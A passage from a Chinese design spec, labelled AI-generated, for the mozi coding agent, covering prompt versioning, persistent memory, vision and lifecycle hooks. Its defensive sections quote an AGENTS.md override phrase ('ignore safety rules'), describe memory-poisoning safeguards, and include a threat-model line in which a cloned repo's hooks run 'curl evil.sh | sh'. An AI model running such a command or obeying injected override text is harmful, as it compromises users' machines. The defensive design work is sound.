- 直接、简洁、技术性；不要奉承，不要赘述显而易见的步骤。
- 做了什么、改了哪些文件、如何验证的——三件事说清楚。
- 不确定的事实要标注"未验证"；没做的事绝不声称做了。
````

配套分层文件：`prompts/identity.md`（L0）、`prompts/capabilities/*.md`（L2，每工具一段准则）、`prompts/policy/*.md`（L3，三档各一段）。

### 15.5 版本管理与变更防护（评测即门禁）

```
1. prompts/ 目录随仓库 git 版本化（promptVersion = 目录内容 hash 前 8 位）；
2. prompt 变更 PR 的 CI 强制门禁：跑 benchmark（M11 §11.4）核心子集（15 任务），
   成功率下降 > 5% → 阻断合并（prompt 回归与代码回归同级对待）；
3. A/B 实验（配置级，非 PR 级）：
   config.prompts.variant = 'identity@experimental'
   → 按会话 ID 哈希分桶（50/50），评测报表按变体分列；
4. 会话调试：mozi prompt show <sessionId> 输出该会话完整系统提示（含各层来源标注）。
```

### 15.6 边界与错误处理

- prompt 超长（模型 4k 输入限制的老模型）：自动降级为精简版 identity-lite.md + 仅核心工具；
- provider 不支持 system role（少见）：L0-L3 前置为首条 user 消息（Provider 层转换）；
- AGENTS.md 试图注入冲突指令（如"忽略安全规则"）：L0 物理在先 + 层间标注「以下为项目自定义约定」，评测集含对抗样例验证模型不会被覆盖。

### 15.7 可测试性

- 组装快照测试：各配置组合（readonly 桌面会话 / general 子会话 / 定时任务 headless）→ 确定性输出快照；
- 预算裁剪序：构造超预算场景断言裁剪顺序与 L0 完整；
- 评测防护：CI 上故意注入劣化 prompt 变体，断言门禁触发（防门禁本身失效）；
- 对抗样例：AGENTS.md 含越权指令 → benchmark 断言模型行为不越界。

---

## M16 记忆系统（Memory）

### 16.1 目标与场景

**职责**：跨会话持久记忆——让 mozi 越用越懂用户与项目：偏好（“回复用中文”）、项目事实（“构建用 pnpm，测试是 pnpm test:unit”）、历史决策（“上次选择了 JWT 方案”）。

**三层记忆模型**：

| 层 | 位置 | 内容 | 注入方式 |
|----|------|------|---------|
| L1 用户记忆 | `~/.mozi/memory/user.md` | 全局偏好：语言/风格/常用命令/禁忌 | 系统提示 L4 固定段（≤800 token） |
| L2 项目记忆 | `<workspace>/.mozi/memory/project.md` | 项目约定/构建命令/已知坑/团队决策 | 同上（≤1200 token，随 workspace） |
| L3 语义记忆 | `<workspace>/.mozi/memory/semantic/`（可选） | 历史会话摘要条目 + embedding | 语义检索 top-k（≤2000 token，按需） |

**与 AGENTS.md 的分工**：AGENTS.md = 项目方**声明式**约定（人写，随 git 提交）；memory = 系统**累积式**学习（agent 写，本地不提交）。冲突时 AGENTS.md 优先，memory 注入时标注「以下为历史学习内容，如与项目约定冲突以约定为准」。

### 16.2 写入机制（确认制为默认，防污染）

```
三种写入路径：

① 显式（用户主权）：用户说「记住这个项目用 pnpm」
   → 模型调用 memory_write 工具（riskLevel: write——记忆写走审批，默认 auto 放行）
   → 直接写入 L2，标记 source: 'user'

② 半自动提取（会话结束后台任务，默认开启但需确认入库）：
   turn 结束且满足触发条件（任务完成 + 会话 token > 20k + 内容含新事实信号）
   → 后台用便宜模型提取候选记忆（结构化：{ type: fact|preference|decision,
     content, evidence: 引用的对话位置 }）
   → 写入 pending 队列（.mozi/memory/pending.jsonl）
   → 下次会话启动时 UI 提示：「学到 3 条候选记忆 [逐条查看] [全部入库] [忽略]」
   → 用户确认后入 L1/L2，标记 source: 'auto-confirmed'

③ 自动（可选关闭，memory.autoWrite: true 时）：跳过确认直接入库，标记
   source: 'auto'，UI 侧栏始终可见最近自动写入（可撤销）

去重与合并：新记忆与已有条目语义相似（cosine > 0.85 或编辑距离近）→ 合并更新
   而非追加；矛盾事实（新 vs 旧）→ 新的覆盖旧的，旧的移入 history（可追溯）。
容量上限：L1 50 条 / L2 200 条，超限 LRU 淘汰（evidence 弱者优先）。
```

### 16.3 检索与注入

```
L1/L2：buildContext（M5 P1 层）全量注入（预算内）；
L3 语义检索：
  1. 会话启动与每 5 轮：当前任务文本 → embedding → 向量检索 top-5（相似度阈值 0.7）
  2. 注入格式（system 段）：
     <memories relevance="high">
     - [fact] 本项目鉴权用 JWT，refresh token 存 Redis（2026-08-12 会话）
     - [decision] 放弃了 session 方案，原因是水平扩展复杂（2026-08-30 会话）
     </memories>
  3. 命中的记忆条目记录 feedback（该记忆是否被后续工具使用佐证）→ 冷记忆降权

实现（零原生依赖约束下的降级链，ADR-008）：
  首选：纯 JS 向量存储（自实现 IVF-flat：Float32Array + 余弦，1 万条内毫秒级）
  embedding：可配置 provider（openai text-embedding-3-small / ollama nomic-embed-text）；
  无 embedding 配置 → 降级 BM25 关键词检索（MiniSearch，纯 JS）——覆盖"精确回忆"
  场景，语义模糊匹配能力弱（文档明示差距）
```

### 16.4 记忆工具集（M3 新增）

| 工具 | risk | 说明 |
|------|------|------|
| `memory_write` | write | `{ layer: 'user'\|'project', type, content }`；去重合并；走审批 |
| `memory_search` | read | `{ query, layer? }` → 命中条目（模型主动回忆） |
| `memory_forget` | write | `{ id }` 删除条目（用户指令驱动） |

工具描述词明确：**只在用户明确要求或高置信事实时写**；不确定的事实用 memory_search 查证而非臆写。

### 16.5 隐私与防投毒

```
隐私：
- 记忆仅本地明文存储，任何通道不外发；移动端（M14）只读查看需 viewMemory 权限
- 敏感过滤：memory_write 内容经 SecretMasker（复用 M6 maskSecret 模式）——
  检测到密钥/token 模式 → 拒写并提示
- mozi memory export --redacted 导出脱敏副本（用户可控分享）

防投毒（信任分级）：
- source: 'user' / 'user-confirmed' → trusted（直接注入）
- source: 'auto' → untrusted（注入时标注「自动学习，未经确认」）
- 外部注入面：AGENTS.md 来自 git（他人可提交）→ 永远视为声明而非事实；
  prompt 对抗评测（M15 §15.6）覆盖记忆注入链路
- 审计：全部 memory 写/删进审计日志（M6 §6.7）
```

### 16.6 可测试性

- 写入链路：显式/半自动/自动三路径 + 去重合并 + 矛盾覆盖 + LRU 淘汰；
- 检索：向量桩（固定 embedding）断言 top-k 与阈值；BM25 降级路径；
- 注入预算：L1+L2 超限时的截断序；语义记忆条数上限；
- 防投毒：untrusted 标注断言；敏感内容拒写；
- 评测：benchmark 增「记忆连续性」任务——多会话场景（第一次会话埋事实，第二次会话提问），断言命中。

---

## M17 多模态（Vision）

### 17.1 目标与场景

**职责**：图片输入（用户粘贴/引用）+ 主动截图（agent 自己看屏幕/浏览器）——覆盖 UI 调试、设计稿对齐、错误截图理解三大场景。语音/视频不在 v1。

| 场景 | 输入来源 | 典型任务 |
|------|---------|---------|
| UI bug 调试 | 用户贴浏览器截图 | 「这个按钮错位了，修复」→ 定位组件 → 改样式 → 截图验证 |
| 设计稿转代码 | 用户贴设计稿 | 「按这个稿子实现卡片组件」 |
| 错误理解 | 用户贴编译/运行错误截图 | 提取错误文本定位问题 |
| 自主 UI 验证 | agent 主动截图 | 启动 dev server → screenshot → 对比预期 |
| 定时任务截图验证 | M13 任务步骤 | 部署后自动检查页面是否正常 |

### 17.2 图片输入管线

```
入口：TUI 粘贴（Ctrl+V）/ 桌面拖入 / 移动端相机与相册 / @文件引用 png-jpg-webp

处理管线（packages/core/src/vision/pipeline.ts）：
1. 校验：格式（png/jpeg/webp）+ 大小（≤5MB，超出本地图像压缩——sharp 纯 wasm 或
   平台原生，遵循零原生依赖：用 @jsquash 系 wasm 库）
2. 尺寸优化：长边 >2048px 等比缩放（多数 provider 的最优上限；省 token）
3. 能力协商（M4 ProviderCapabilities.vision）：
   executor 支持 → 注入 UserContent { type:'image', dataUrl }
   不支持 → 降级：tesseract.js（wasm OCR）提取文本；若文本置信度低且任务依赖
   视觉 → 明确告知用户「当前模型不支持图片，请换 vision 模型（/model）」而非硬猜
4. Token 计费：按 provider 公式估算图片 token（OpenAI: (w×h)/750；各家差异在
   Provider 层封装），计入会话预算（M5）
5. 存储：原图落盘 .mozi/media/<id>.png（会话引用），事件只带 contentId（M14 附件机制复用）

历史消息中的图片：进入压缩区（M5 Auto-Compact）时，图片替换为
「[图片：<id>，OCR 摘要：<前100字>]」——防止历史图片持续烧 token。
```

### 17.3 screenshot 工具（agent 主动获取视觉输入）

```
名称：screenshot | riskLevel: read | 需要屏幕录制权限（首次调用系统弹授权）

parameters:
  target?: { kind: 'screen' }                       # 全屏/当前屏
        | { kind: 'window', title: string }          # 按窗口标题
        | { kind: 'browser', url: string; waitMs?: number; fullPage?: boolean }
  annotate?: { highlight?: string }                  # 可选：OCR 定位文本画框（辅助模型）

实现：
  桌面端：Electron desktopCapturer（窗口枚举 + 截取）
  CLI：平台原生命令（mac: screencapture / win: PowerShell Graphics.CopyFromScreen /
       linux: grim|import，按桌面环境探测）→ 落盘 → 统一管线处理
  browser 模式：内置轻量 headless（playwright-core，按需动态安装，不进默认依赖）；
    加载 url → waitMs（或 networkidle）→ 截图（fullPage 可选）

输出：截断的 OCR 文本摘要 + 图片引用；display: 图片卡片（TUI 保存路径提示，
  桌面/移动端直接渲染）
典型用法（模型侧）：启动服务 → sleep → screenshot(browser, localhost:3000)
  → 视觉检查 → 修复 → 复截对比
```

### 17.4 定时任务截图验证（M13 联动）

```ts
// TaskRunConfig 新增可选步骤（在 prompt 之后执行）
interface VerifyStep {
  kind: 'screenshot';
  url: string;                  // 待验证页面
  expectation: string;          // 自然语言预期：「登录表单居中且无报错弹窗」
  failIf?: 'mismatch';          // 结果写入报告，mismatch 可选置为任务失败
}
// 执行：playwright 截图 → vision 模型对比 expectation（结构化判定：
//   { verdict: 'pass'|'fail'|'unclear', evidence }）→ 报告附截图与判定
// 任务配置校验：executor 模型必须 vision-capable，否则创建时拒绝
```

### 17.5 评测与测试

- 管线：格式/大小/缩放/OCR 降级/能力协商拒绝路径（参数化）；
- screenshot：三平台桩（命令探测 mock）+ browser 模式（本地 http 桩页面断言截图字节）；
- 评测集新增多模态任务组（L2 级 5 个）：贴图修 UI（预置 bug 仓库 + 截图）、设计稿还原（断言关键 DOM/样式）、错误截图定位；
- Token 计费：与 provider 真实 usage 对账（fixture）。

---

## M18 Hooks 与生命周期插件

### 18.1 目标与边界

**职责**：让用户在不动 mozi 源码的前提下挂钩生命周期事件——横切关注点（合规审计、自动格式化、企业通知、红线拦截）。定位类比 git hooks / Claude Code hooks。

**与既有扩展机制的正交关系**：MCP = 增加新**能力**（工具）；子智能体 = **委派**任务；Hooks = 在既有动作**前后**插入用户逻辑（不改变动作本身）。

### 18.2 钩子点（事件清单）

| 钩子 | 时机 | 载荷关键字段 |
|------|------|-------------|
| `session:start` / `session:end` | 会话建立/结束 | sessionId、workspace |
| `turn:start` / `turn:end` | 每轮开始/结束 | turnId、input、usage（end） |
| `tool:pre` / `tool:post` | 工具执行前后 | tool、arguments、（post）result、durationMs |
| `approval:pre` / `approval:post` | 审批评估前后 | call、riskSegments、decision |
| `compact:pre` / `compact:post` | 上下文压缩前后 | removedTurns、savedTokens |
| `task:run:pre` / `task:run:post` | 定时任务运行前后（M13） | taskId、runId、（post）status |

### 18.3 配置格式

```jsonc
// ~/.mozi/hooks.json（用户级，直接生效）
// <workspace>/.mozi/hooks.json（项目级，默认禁用——见 18.5 防投毒）
{
  "hooks": [
    {
      "event": "tool:pre",
      "match": { "tool": "shell", "commandPattern": "npm (test|run build)" },
      "run": "node .githooks/pre-shell.js",       // 进程执行；stdin 收 JSON 载荷
      "timeoutMs": 5000,
      "onExit": { "0": "continue", "2": "block", "*": "ask" }
    },
    {
      "event": "tool:post",
      "match": { "tool": "edit_file" },
      "run": "npx lint-staged",                    // 用例：改完自动 lint
      "onExit": { "*": "continue" }                // lint 失败不阻断，仅 stderr 展示
    }
  ]
}
```

### 18.4 执行语义（精确规格）

```
进程模型：每次触发 spawn 一次（无守护；快进快出；幂等由脚本自负）
载荷：stdin = JSON（事件载荷 + 会话上下文摘要）；stdout/stderr 各截 4KB
退出码语义：
  0  → continue（放行；stdout 若为 JSON { "note": "..." } 则作为系统提示注入下轮）
  2  → block（阻断动作：tool:pre 阻断则该工具调用被拒绝，拒绝信息=stderr 给模型自纠）
  其他 → onExit 映射（默认 ask → 走审批卡，卡片显示「被 hook 拦截待确认」）
超时：默认 5s（可配 ≤60s），超时按 onExit['*'] 处理 + 告警事件
环境：HOOK_EVENT/HOOK_SESSION_ID 环境变量；cwd = workspace；不继承 mozi 进程密钥环境
失败隔离：hook 进程崩溃/不存在 → 按 onExit['*']（默认 continue）+ 事件记录；
  连续失败 10 次自动禁用该 hook 并通知（防每次工具调用都卡 5s 超时）
执行通道：hook 不过沙箱（它就是用户自己的脚本，等同用户直接执行）——但全部执行进审计日志（M6）
```

### 18.5 防投毒（项目级 hooks 是攻击面）

```
威胁：clone 恶意仓库 → .mozi/hooks.json 含 curl evil.sh | sh → 用户一打开就执行。

防线：
1. 项目级 hooks 默认 disabled；首次发现 → 显式提示「该仓库请求安装 N 个钩子」
   → 用户逐个审查（显示命令全文）→ 一次性确认启用
2. 启用记录指纹（文件 hash）；文件变更 → 重新确认（防提交后偷改）
3. 用户级 hooks 不受此限（用户自己写的 = 用户权限）
4. CI/headless（mozi exec / M13 任务）：项目级 hooks 一律忽略（不可交互确认的环境
   不执行未确认代码）；用户级 hooks 保留
```

### 18.6 典型用例（文档示例）

| 用例 | 配置要点 |
|------|---------|
| 编辑后自动格式化 | tool:post + edit_file → `prettier --write $FILE`（载荷含改动文件） |
| 企业合规审计 | approval:post / tool:post → 上报内部审计端点（含决策与参数摘要） |
| 红线拦截 | tool:pre + pathGlob 匹配 `**/prod/**` → exit 2 阻断 |
| 任务结果通知 | task:run:post → 发企业微信/钉钉 webhook（M13 通知之外的补充通道） |
| 压缩前快照 | compact:pre → cp 会话报告到归档目录 |

### 18.7 可测试性

- 执行语义矩阵：退出码 × 事件 × onExit 映射（参数化穷举）；
- 超时与失败隔离：慢脚本/崩溃脚本/不存在命令 → 断言降级路径与自动禁用；
- 防投毒：项目级首次确认/指纹变更重确认/headless 忽略（三条不变式测试）；
- 载荷注入：stdout JSON note 注入下轮上下文的链路（ScriptedProvider 断言）；
- E2E：真实仓库 fixture 含恶意 hooks.json → mozi exec 忽略 + 交互打开提示确认。

> AI生成